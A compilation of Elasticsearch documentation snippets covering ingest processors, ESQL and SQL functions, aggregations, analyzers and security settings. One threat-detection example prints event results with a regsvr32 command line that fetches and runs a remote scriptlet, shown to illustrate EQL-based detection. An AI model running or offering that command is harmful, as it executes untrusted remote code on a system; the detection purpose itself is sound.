https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-ingest-processors-in-painless.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPOST /_ingest/pipeline/_simulate?verbose\n{\n  \"pipeline\": {\n    \"processors\": [\n      {\n        \"script\": {\n          \"lang\": \"painless\",\n          \"source\": \"\"\"\n            long bytes = Processors.bytes(ctx.size);\n            ctx.size_in_bytes = bytes;\n          \"\"\"\n        }\n      }\n    ]\n  },\n  \"docs\": [\n    {\n      \"_source\": {\n        \"size\": \"1kb\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Classification Inference Processor\nDESCRIPTION: Configuration example for classification inference with top classes and probability settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/inference-processor.md#2025-04-21_snippet_11\n\nLANGUAGE: json\nCODE:\n```\n\"inference\":{\n  \"model_id\":\"my_model_id\"\n  \"inference_config\": {\n    \"classification\": {\n      \"num_top_classes\": 2,\n      \"results_field\": \"prediction\",\n      \"top_classes_results_field\": \"probabilities\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: HTTP Compression Settings in Elasticsearch\nDESCRIPTION: Configuration for HTTP compression including compression level settings. Default is disabled for HTTPS traffic unless explicitly enabled.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nhttp.compression: true\nhttp.compression_level: 3\n```\n\n----------------------------------------\n\nTITLE: Defining ESQL Function Parameter for IPv4 Address Formatting\nDESCRIPTION: Documentation for the 'leading_zeros' parameter which controls how leading zeros are handled in IPv4 addresses. This parameter appears to be a keyword that configures formatting behavior for IP-related functions in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/functionNamedParams/to_ip.md#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n`leading_zeros`\n:   (keyword) What to do with leading 0s in IPv4 addresses.\n```\n\n----------------------------------------\n\nTITLE: DATE_ADD Example: Add Years\nDESCRIPTION: Demonstrates the DATE_ADD function by adding 10 years to a given datetime. The SQL query shows how to use DATE_ADD with the 'years' unit.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_22\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATE_ADD('years', 10, '2019-09-04T11:22:33.000Z'::datetime) AS \\\"+10 years\\\";\\n\\n      +10 years\n------------------------\n2029-09-04T11:22:33.000Z\"\n```\n\n----------------------------------------\n\nTITLE: GeoJSON Circle Processing Response Example\nDESCRIPTION: This snippet shows the response after indexing a GeoJSON circle through the circle processor pipeline. The original circle has been converted to a GeoJSON polygon with coordinates that approximate the circle within the specified error distance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ingest-circle-processor.md#2025-04-21_snippet_4\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"found\": true,\n  \"_index\": \"circles\",\n  \"_id\": \"2\",\n  \"_version\": 1,\n  \"_seq_no\": 22,\n  \"_primary_term\": 1,\n  \"_source\": {\n    \"circle\": {\n      \"coordinates\": [\n        [\n          [30.000365257263184, 10.0],\n          [30.000111397193788, 10.00034284530941],\n          [29.999706043744222, 10.000213571721195],\n          [29.999706043744222, 9.999786428278805],\n          [30.000111397193788, 9.99965715469059],\n          [30.000365257263184, 10.0]\n        ]\n      ],\n      \"type\": \"Polygon\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Mapping Response with Preserved Dot Field Names\nDESCRIPTION: This console result shows the mapping after configuring fields with 'subobjects' set to false. The output demonstrates how dots in field names are preserved, allowing fields like 'time.min' and 'time.max' to exist alongside 'time' as direct properties.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/subobjects.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"my-index-000001\" : {\n    \"mappings\" : {\n      \"properties\" : {\n        \"metrics\" : {\n          \"subobjects\" : false,\n          \"properties\" : {\n            \"time\" : {\n              \"type\" : \"long\"\n            },\n            \"time.min\" : { <1>\n              \"type\" : \"long\"\n            },\n            \"time.max\" : {\n              \"type\" : \"long\"\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Copying Complex Values with copy_from\nDESCRIPTION: Example demonstrating how to copy complex values like arrays between fields using the copy_from parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/set-processor.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/set_bar\n{\n  \"description\": \"sets the value of bar from the field foo\",\n  \"processors\": [\n    {\n      \"set\": {\n        \"field\": \"bar\",\n        \"copy_from\": \"foo\"\n      }\n    }\n  ]\n}\n\nPOST _ingest/pipeline/set_bar/_simulate\n{\n  \"docs\": [\n    {\n      \"_source\": {\n        \"foo\": [\"foo1\", \"foo2\"]\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring IP Filtering in Elasticsearch\nDESCRIPTION: Settings for IP filtering in Elasticsearch that control which IP addresses are allowed or denied access to transport and HTTP connections. These settings can be applied globally or to specific transport profiles.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_50\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.transport.filter.allow\n```\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.transport.filter.deny\n```\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.filter.allow\n```\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.filter.deny\n```\n\nLANGUAGE: yaml\nCODE:\n```\ntransport.profiles.$PROFILE.xpack.security.filter.allow\n```\n\nLANGUAGE: yaml\nCODE:\n```\ntransport.profiles.$PROFILE.xpack.security.filter.deny\n```\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster.filter.allow\n```\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster.filter.deny\n```\n\n----------------------------------------\n\nTITLE: Encoding String to Base64 using TO_BASE64 Function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the TO_BASE64 function in ESQL to encode a string to base64 format. It creates a row with a string value and then applies the TO_BASE64 function to encode it.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_base64.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"elastic\"\n| EVAL e = TO_BASE64(a)\n```\n\n----------------------------------------\n\nTITLE: Defining Bucket Selector Aggregation in Elasticsearch\nDESCRIPTION: This snippet shows the basic syntax for a bucket selector aggregation in Elasticsearch. It defines variables for bucket paths and a script to determine bucket retention.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-bucket-selector-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"bucket_selector\": {\n    \"buckets_path\": {\n      \"my_var1\": \"the_sum\",\n      \"my_var2\": \"the_value_count\"\n    },\n    \"script\": \"params.my_var1 > params.my_var2\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Geometry Type Support Matrix in Markdown\nDESCRIPTION: A markdown table showing supported geometry type combinations between geomA and geomB parameters and their corresponding boolean return values. Covers both cartesian and geographic coordinate types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/st_intersects.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| geomA | geomB | result |\n| --- | --- | --- |\n| cartesian_point | cartesian_point | boolean |\n| cartesian_point | cartesian_shape | boolean |\n| cartesian_shape | cartesian_point | boolean |\n| cartesian_shape | cartesian_shape | boolean |\n| geo_point | geo_point | boolean |\n| geo_point | geo_shape | boolean |\n| geo_shape | geo_point | boolean |\n| geo_shape | geo_shape | boolean |\n```\n\n----------------------------------------\n\nTITLE: Defining Null Role Descriptor in Elasticsearch\nDESCRIPTION: This snippet defines a null role descriptor with empty permissions for cluster, indices, applications, and run-as fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/security/audit/logfile/audited_roles.txt#2025-04-22_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\"cluster\":[],\"indices\":[],\"applications\":[],\"run_as\":[]}\n```\n\n----------------------------------------\n\nTITLE: Using TRIM Function in Elasticsearch SQL\nDESCRIPTION: Removes leading and trailing whitespace from a string input. Takes a single string parameter and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_20\n\nLANGUAGE: sql\nCODE:\n```\nTRIM(string_exp) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT TRIM('   Elastic   ') AS trimmed;\n\ntrimmed\n--------------\nElastic\n```\n\n----------------------------------------\n\nTITLE: Markdown Navigation Configuration for ESQL Operators\nDESCRIPTION: Configuration block defining the navigation and page mapping for ESQL operators documentation in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/functions-operators/operators.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nnavigation_title: \"Operators\"\nmapped_pages:\n  - https://www.elastic.co/guide/en/elasticsearch/reference/current/esql-functions-operators.html#esql-operators\n```\n\n----------------------------------------\n\nTITLE: Defining Inner Hits in Elasticsearch Query\nDESCRIPTION: Shows the basic structure for defining inner hits on a nested, has_child, or has_parent query in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-inner-hits.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n\"<query>\" : {\n    \"inner_hits\" : {\n        <inner_hits_options>\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering with NOW Function and Interval in Elasticsearch SQL\nDESCRIPTION: Example demonstrating how to use NOW() function with INTERVAL subtraction for relative datetime filtering.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_20\n\nLANGUAGE: sql\nCODE:\n```\nSELECT first_name FROM emp WHERE hire_date > NOW() - INTERVAL 100 YEARS ORDER BY first_name ASC LIMIT 5;\n\n  first_name\n---------------\nAlejandro\nAmabile\nAnneke\nAnoosh\nArumugam\n```\n\n----------------------------------------\n\nTITLE: Analyzing EQL Sequence Query Results for Malicious Script Detection\nDESCRIPTION: This snippet shows the results of the EQL sequence query. It includes detailed information about the matched sequence, including process creation, library loading, and network activity events, confirming the likelihood of a successful attack.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-ex-threat-detection.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\n{\n  ...\n  \"hits\": {\n    \"total\": {\n      \"value\": 1,\n      \"relation\": \"eq\"\n    },\n    \"sequences\": [\n      {\n        \"join_keys\": [\n          2012\n        ],\n        \"events\": [\n          {\n            \"_index\": \".ds-my-data-stream-2099.12.07-000001\",\n            \"_id\": \"gl5MJXMBMk1dGnErnBW8\",\n            \"_source\": {\n              \"process\": {\n                \"parent\": {\n                  \"name\": \"cmd.exe\",\n                  \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010AA385401}\",\n                  \"executable\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n                },\n                \"name\": \"regsvr32.exe\",\n                \"pid\": 2012,\n                \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n                \"command_line\": \"regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\",\n                \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\n                \"ppid\": 2652\n              },\n              \"logon_id\": 217055,\n              \"@timestamp\": 131883573237130000,\n              \"event\": {\n                \"category\": \"process\",\n                \"type\": \"creation\"\n              },\n              \"user\": {\n                \"full_name\": \"bob\",\n                \"domain\": \"ART-DESKTOP\",\n                \"id\": \"ART-DESKTOP\\\\bob\"\n              }\n            }\n          },\n          {\n            \"_index\": \".ds-my-data-stream-2099.12.07-000001\",\n            \"_id\": \"ol5MJXMBMk1dGnErnBW8\",\n            \"_source\": {\n              \"process\": {\n                \"name\": \"regsvr32.exe\",\n                \"pid\": 2012,\n                \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n                \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n              },\n              \"@timestamp\": 131883573237450016,\n              \"dll\": {\n                \"path\": \"C:\\\\Windows\\\\System32\\\\scrobj.dll\",\n                \"name\": \"scrobj.dll\"\n              },\n              \"event\": {\n                \"category\": \"library\"\n              }\n            }\n          },\n          {\n            \"_index\": \".ds-my-data-stream-2099.12.07-000001\",\n            \"_id\": \"EF5MJXMBMk1dGnErnBa9\",\n            \"_source\": {\n              \"process\": {\n                \"name\": \"regsvr32.exe\",\n                \"pid\": 2012,\n                \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n                \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n              },\n              \"@timestamp\": 131883573238680000,\n              \"destination\": {\n                \"address\": \"151.101.48.133\",\n                \"port\": \"443\"\n              },\n              \"source\": {\n                \"address\": \"192.168.162.134\",\n                \"port\": \"50505\"\n              },\n              \"event\": {\n                \"category\": \"network\"\n              },\n              \"user\": {\n                \"full_name\": \"bob\",\n                \"domain\": \"ART-DESKTOP\",\n                \"id\": \"ART-DESKTOP\\\\bob\"\n              },\n              \"network\": {\n                \"protocol\": \"tcp\",\n                \"direction\": \"outbound\"\n              }\n            }\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Search with matched_fields in Fast Vector Highlighter\nDESCRIPTION: Uses the Fast Vector Highlighter with matched_fields to combine matches from both 'comment' and 'comment.english', enabling highlighting of stemmed variants in results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_16\n\nLANGUAGE: json\nCODE:\n```\nGET index2/_search\n{\n  \"query\": {\n    \"query_string\": {\n      \"query\": \"running with scissors\",\n      \"fields\": [\"comment\", \"comment.english\"]\n    }\n  },\n  \"highlight\": {\n    \"order\": \"score\",\n    \"fields\": {\n      \"comment\": {\n        \"type\" : \"fvh\",\n        \"matched_fields\": [\"comment\", \"comment.english\"]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using CURRENT_TIMESTAMP Function in Elasticsearch SQL\nDESCRIPTION: Example demonstrating the CURRENT_TIMESTAMP() function with default precision to get the current date and time.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_18\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CURRENT_TIMESTAMP() AS result;\n\n         result\n------------------------\n2018-12-12T14:48:52.448Z\n```\n\n----------------------------------------\n\nTITLE: Excluding Specific Indices from a Pattern Search in Elasticsearch\nDESCRIPTION: This example demonstrates how to exclude specific indices from a pattern search using a bool query with must_not clause. It searches all indices starting with 'my-index-' except for 'my-index-01'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-multiple-data-streams-indices.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-*/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": [\n        {\n          \"match\": {\n            \"user.id\": \"kimchy\"\n          }\n        }\n      ],\n      \"must_not\": [\n        {\n          \"terms\": {\n            \"_index\": [\"my-index-01\"]\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: COUNT_DISTINCT with Precision Threshold in ESQL\nDESCRIPTION: Shows how to use COUNT_DISTINCT with a precision threshold parameter. Different thresholds (80000 and 5) are applied to control the accuracy vs. memory usage trade-off.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/count_distinct.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM hosts\n| STATS COUNT_DISTINCT(ip0, 80000), COUNT_DISTINCT(ip1, 5)\n```\n\n----------------------------------------\n\nTITLE: Optimizing Scripted Similarity with Weight Script in Elasticsearch\nDESCRIPTION: An example of how to optimize a scripted similarity in Elasticsearch by separating the document-independent calculations into a weight_script. This approach improves efficiency while maintaining the same scoring behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/similarity.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT /index\n{\n  \"settings\": {\n    \"number_of_shards\": 1,\n    \"similarity\": {\n      \"scripted_tfidf\": {\n        \"type\": \"scripted\",\n        \"weight_script\": {\n          \"source\": \"double idf = Math.log((field.docCount+1.0)/(term.docFreq+1.0)) + 1.0; return query.boost * idf;\"\n        },\n        \"script\": {\n          \"source\": \"double tf = Math.sqrt(doc.freq); double norm = 1/Math.sqrt(doc.length); return weight * tf * norm;\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"field\": {\n        \"type\": \"text\",\n        \"similarity\": \"scripted_tfidf\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Post Filter with Aggregations in Elasticsearch\nDESCRIPTION: Demonstrates using post_filter to show all Gucci shirt colors in aggregations while filtering search results to only red shirts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/filter-search-results.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\nGET /shirts/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"filter\": {\n        \"term\": { \"brand\": \"gucci\" }\n      }\n    }\n  },\n  \"aggs\": {\n    \"colors\": {\n      \"terms\": { \"field\": \"color\" }\n    },\n    \"color_red\": {\n      \"filter\": {\n        \"term\": { \"color\": \"red\" }\n      },\n      \"aggs\": {\n        \"models\": {\n          \"terms\": { \"field\": \"model\" }\n        }\n      }\n    }\n  },\n  \"post_filter\": {\n    \"term\": { \"color\": \"red\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Transport Client Privilege\nDESCRIPTION: Privileges required for transport client connection and cross-cluster search. Not available in serverless deployments\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/security-privileges.md#2025-04-21_snippet_13\n\nLANGUAGE: markdown\nCODE:\n```\ntransport_client\n```\n\n----------------------------------------\n\nTITLE: Configuring Average Bucket Aggregation in Elasticsearch\nDESCRIPTION: JSON configuration for the average bucket aggregation, specifying the buckets path, gap policy, and output format. This snippet shows the basic structure and available parameters for the aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-avg-bucket-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n\"avg_bucket\": {\n  \"buckets_path\": \"sales_per_month>sales\",\n  \"gap_policy\": \"skip\",\n  \"format\": \"#,##0.00;(#,##0.00)\"\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Derivative Aggregation Syntax\nDESCRIPTION: Shows the basic syntax structure for a derivative aggregation that calculates changes in a metric over time.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-derivative-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n\"derivative\": {\n  \"buckets_path\": \"the_sum\"\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Synonym Graph and Flatten Graph Filters in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the synonym_graph filter to add multi-position synonyms and then flatten the resulting token graph using the flatten_graph filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-flatten-graph-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"standard\",\n  \"filter\": [\n    {\n      \"type\": \"synonym_graph\",\n      \"synonyms\": [ \"internet phonebook, domain name system\" ]\n    },\n    \"flatten_graph\"\n  ],\n  \"text\": \"domain name system is fragile\"\n}\n```\n\n----------------------------------------\n\nTITLE: Persian Custom Analyzer Implementation\nDESCRIPTION: Shows how to reimplement the Persian analyzer with custom character filters for zero-width spaces and various token filters for normalization and stemming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_23\n\nLANGUAGE: console\nCODE:\n```\nPUT /persian_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"char_filter\": {\n        \"zero_width_spaces\": {\n            \"type\":       \"mapping\",\n            \"mappings\": [ \"\\\\u200C=>\\\\u0020\"]\n        }\n      },\n      \"filter\": {\n        \"persian_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_persian_\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_persian\": {\n          \"tokenizer\":     \"standard\",\n          \"char_filter\": [ \"zero_width_spaces\" ],\n          \"filter\": [\n            \"lowercase\",\n            \"decimal_digit\",\n            \"arabic_normalization\",\n            \"persian_normalization\",\n            \"persian_stop\",\n            \"persian_stem\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Script Field Access Examples\nDESCRIPTION: Shows different ways to access fields in scripts when using synthetic _source, including both incorrect and recommended approaches.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-source-field.md#2025-04-21_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n\"script\": { \"source\": \"\"\"  emit(params._source['foo.bar.baz'])  \"\"\" }\n```\n\nLANGUAGE: javascript\nCODE:\n```\n\"script\": { \"source\": \"\"\"  emit(params._source['foo']['bar']['baz'])  \"\"\" }\n```\n\nLANGUAGE: javascript\nCODE:\n```\n\"script\": { \"source\": \"\"\"  emit(params._source.foo.bar.baz)  \"\"\" }\n```\n\nLANGUAGE: javascript\nCODE:\n```\n\"script\": { \"source\": \"\"\"  emit(field('foo.bar.baz').get(null))   \"\"\" }\n```\n\nLANGUAGE: javascript\nCODE:\n```\n\"script\": { \"source\": \"\"\"  emit($('foo.bar.baz', null))   \"\"\" }\n```\n\n----------------------------------------\n\nTITLE: Configuring LDAP Connection Settings in Elasticsearch\nDESCRIPTION: Basic LDAP connection parameters including referral handling, metadata loading, and timeout settings. These static cluster settings control how Elasticsearch connects to and interacts with LDAP servers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nfollow_referrals: true\nmetadata: []\ntimeout.tcp_connect: 5s\ntimeout.tcp_read: 5s\ntimeout.response: 5s\ntimeout.ldap_search: 5s\n```\n\n----------------------------------------\n\nTITLE: Defining Frequent Item Sets Aggregation in Elasticsearch\nDESCRIPTION: Example of a frequent_item_sets aggregation in Elasticsearch, specifying minimum set size and fields to analyze.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-frequent-item-sets-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n\"frequent_item_sets\": {\n  \"minimum_set_size\": 3,\n  \"fields\": [\n    {\"field\": \"my_field_1\"},\n    {\"field\": \"my_field_2\"}\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Paginating Search Results Using from and size Parameters in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the from and size parameters to paginate search results in Elasticsearch. The from parameter defines how many hits to skip (starting at position 5), while size specifies the maximum number of results to return (20).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"from\": 5,\n  \"size\": 20,\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Period Methods and Fields\nDESCRIPTION: Lists the methods and fields available in the java.time.Period class. It summarizes functionalities for creating, manipulating, and querying periods, including operations for calculating periods between dates, adding or subtracting durations, scaling, and normalizing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_12\n\nLANGUAGE: java\nCODE:\n```\n\"class java.time.Period {\n  Period ZERO\n  Period between(LocalDate,LocalDate)\n  Period from(TemporalAmount)\n  IsoChronology getChronology()\n  int getDays()\n  int getMonths()\n  int getYears()\n  Period of(int,int,int)\n  Period ofYears(int)\n  Period ofMonths(int)\n  Period ofWeeks(int)\n  Period ofDays(int)\n  Period parse(CharSequence)\n  Period plus(TemporalAmount)\n  Period plusYears(long)\n  Period plusMonths(long)\n  Period plusDays(long)\n  Period minus(TemporalAmount)\n  Period minusYears(long)\n  Period minusMonths(long)\n  Period minusDays(long)\n  Period multipliedBy(int)\n  Period negated()\n  Period normalized()\n  long toTotalMonths()\n  Period withDays(int)\n  Period withMonths(int)\n  Period withYears(int)\n}\"\n```\n\n----------------------------------------\n\nTITLE: Indexing Pre-aggregated Histogram Data with _doc_count in Elasticsearch\nDESCRIPTION: This snippet shows how to index two documents containing pre-aggregated histogram data. Each document includes the _doc_count field to specify the actual number of documents represented by the pre-aggregated data (45 and 62 respectively).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-doc-count-field.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my_index/_doc/1\n{\n  \"my_text\" : \"histogram_1\",\n  \"my_histogram\" : {\n      \"values\" : [0.1, 0.2, 0.3, 0.4, 0.5],\n      \"counts\" : [3, 7, 23, 12, 6]\n   },\n  \"_doc_count\": 45 <1>\n}\n\nPUT my_index/_doc/2\n{\n  \"my_text\" : \"histogram_2\",\n  \"my_histogram\" : {\n      \"values\" : [0.1, 0.25, 0.35, 0.4, 0.45, 0.5],\n      \"counts\" : [8, 17, 8, 7, 6, 2]\n   },\n  \"_doc_count\": 62 <1>\n}\n```\n\n----------------------------------------\n\nTITLE: Fetch Documents with Standard and Custom Fields\nDESCRIPTION: This snippet demonstrates how to fetch documents with all fields or specific field types (standard or custom) from Salesforce. Users will input their desired field types through a SOQL query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-salesforce.md#2025-04-21_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\n[\n  {\n    \"query\": \"SELECT FIELDS(ALL) FROM Account\",\n    \"language\": \"SOQL\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Field Collapse Example with Top Hits in Elasticsearch\nDESCRIPTION: This example shows how to implement field collapsing or result grouping using a terms aggregator with a top_hits sub-aggregator. It groups webpages by domain and orders results by relevancy.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-top-hits-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"query\": {\n    \"match\": {\n      \"body\": \"elections\"\n    }\n  },\n  \"aggs\": {\n    \"top_sites\": {\n      \"terms\": {\n        \"field\": \"domain\",\n        \"order\": {\n          \"top_hit\": \"desc\"\n        }\n      },\n      \"aggs\": {\n        \"top_tags_hits\": {\n          \"top_hits\": {}\n        },\n        \"top_hit\" : {\n          \"max\": {\n            \"script\": {\n              \"source\": \"_score\"\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Manipulating Multi-Dimensional Arrays in Painless\nDESCRIPTION: Demonstrates the creation and use of a three-dimensional integer array in Painless, including initialization and element access.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-types.md#2025-04-22_snippet_10\n\nLANGUAGE: painless\nCODE:\n```\nint[][][] ia3 = new int[2][3][4]; \nia3[1][2][3] = 99;                \nint i = ia3[1][2][3];             \n```\n\n----------------------------------------\n\nTITLE: Installing Multiple Elasticsearch Plugins in a Single Command\nDESCRIPTION: Command for installing multiple Elasticsearch plugins simultaneously. The syntax allows specifying multiple plugin_ids in one command, where each plugin_id can be a core plugin name or a custom URL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/installing-multiple-plugins.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nsudo bin/elasticsearch-plugin install [plugin_id] [plugin_id] ... [plugin_id]\n```\n\n----------------------------------------\n\nTITLE: Executing Matrix Stats Aggregation in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the matrix_stats aggregation to compute statistics on poverty and income fields. It shows the basic structure of the aggregation request.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-matrix-stats-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"statistics\": {\n      \"matrix_stats\": {\n        \"fields\": [ \"poverty\", \"income\" ]\n      }\n    }\n  